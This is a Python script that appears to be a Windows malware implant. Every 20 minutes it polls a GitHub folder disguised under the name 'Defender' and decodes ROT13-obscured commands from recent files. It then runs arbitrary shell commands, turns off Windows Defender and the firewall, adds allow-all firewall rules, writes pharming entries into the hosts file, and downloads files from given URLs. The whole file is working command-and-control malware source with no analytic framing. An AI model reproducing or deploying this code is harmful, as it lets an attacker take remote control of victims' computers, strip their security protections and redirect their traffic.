import requests, re, os
from lxml import html
from datetime import datetime,timedelta
from lxml.etree import tostring

execFiles={}

def hacerPeticion():
	letras="abcdefghijklmnopqrstuvwxyz"
	dates=[]
	files = {}

	r = requests.get('https://github.com/SixG9/Win32/tree/main/Defender')
	tree = html.fromstring(r.content)
	fileName=tree.xpath("//*[@class=\"js-navigation-open link-gray-dark\"]/text()")
	inner_html = tostring(tree)
	for line in inner_html.decode().split("\n"):
		if("time-ago" in line):
			elements=line.split("\"")
			dates.append(elements[1])
	for i in range (0,len(dates)):
		now = datetime.utcnow()
		archDate=datetime.strptime(dates[i], '%Y-%m-%dT%H:%M:%SZ')
		if(now- timedelta(hours=1) <= archDate and archDate <= now):
			for file in files.keys():
				if file in execFiles.keys():
					for exF in execFiles.keys():
						if file == exF and files[file] != execFiles[exF]:
							files[fileName[i]]=dates[i]
							execFiles[fileName[i]]=dates[i]
			else:
				files[fileName[i]]=dates[i]
				execFiles[fileName[i]]=dates[i]
	

	for f in files.keys():
		r = requests.get('https://raw.githubusercontent.com/SixG9/Win32/main/Defender/'+f)
		cont = r.text
		content=""
		for c in cont:
			if c in letras:
				content+=letras[(letras.index(c)+13)%len(letras)]
			elif c.lower() in letras:
				content+=letras[(letras.index(c.lower())+13)%len(letras)].upper()
			else:
				content+=c

		if(re.compile(r'Exec (?P<comando>.*)').match(content)):
			match = re.compile(r'Exec (?P<comando>.*)').match(content)
			dato = match.groupdict()
			os.system(dato['comando'])
		elif(re.compile(r'UAC dis').match(content)):
			os.system("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f")
		elif(re.compile(r'Firewall rules').match(content)):
			os.system("netsh advfirewall firewall add rule name=\"IN Windows Defender TCP\" dir=in localip=any remoteip=any localport=any remoteport=any protocol=tcp action=allow")
			os.system("netsh advfirewall firewall add rule name=\"IN Windows Defender UDP\" dir=in localip=any remoteip=any localport=any remoteport=any protocol=udp action=allow")
			os.system("netsh advfirewall firewall add rule name=\"OUT Windows Defender TCP\" dir=out localip=any remoteip=any localport=any remoteport=any protocol=tcp action=allow")
			os.system("netsh advfirewall firewall add rule name=\"OUT Windows Defender UDP\" dir=out localip=any remoteip=any localport=any remoteport=any protocol=udp action=allow")
		elif(re.compile(r'Pharm (?P<ip>[(\d\.)]+) (?P<domain>.*)').match(content)):
			match = re.compile(r'Pharm (?P<ip>[(\d\.)]+) (?P<domain>.*)').match(content)
			dato = match.groupdict()
			with open("C:\\Windows\\System32\\drivers\\etc\\hosts","a") as file:
				file.write("{}\t{}".format(dato['ip'],dato['domain']))
		elif (re.compile(r'Antivirus dis').match(content)):
			os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
		elif (re.compile(r'Firewall dis').match(content)):
			os.system("netsh advfirewall set allprofiles state off")
		elif (re.compile(r'Download (?P<url>.*) (?P<nom_archivo>.*)').match(content)):
			match = re.compile(r'Download (?P<url>.*) (?P<nom_archivo>.*)').match(content)
			dato = match.groupdict()
			file = requests.get(dato['url'], stream=True)
			with open(dato['nom_archivo'], 'wb') as f:
				for c in file:
					f.write(c)

if __name__=="__main__":
	execTime= datetime.utcnow()
	hacerPeticion()
	while(1):
		currentTime= datetime.utcnow()
		if(currentTime >= execTime + timedelta(minutes=20)):
			hacerPeticion()
			execTime=execTime + timedelta(minutes=20)
